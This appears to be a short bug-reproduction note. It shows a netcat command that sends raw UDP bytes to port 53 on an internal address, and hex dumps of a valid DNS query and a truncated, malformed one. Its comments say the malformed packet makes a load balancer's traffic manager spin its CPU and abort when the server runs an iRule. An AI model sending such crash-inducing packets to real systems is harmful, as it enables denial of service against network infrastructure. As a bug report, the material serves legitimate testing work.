echo -en $(</root/udp.hex) | nc -u 10.1.1.64 53

#---here is a simplified good packet I made to query www.example.com type A address

#\x3e\x46\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x07\x65\x78\x61\x6d\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01

#---a malformed simplified bad packet I made by removing the all the payload after www.example.c, so the string 'om' and type A and class are gone:

#\x3e\x46\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x07\x65\x78\x61\x6d\x70\x6c\x65\x03\x63

#feed the malformed bad packet to the virtual server with the irule, it will cause tmm spin up cpu and tmm got sigaborted in the end. 

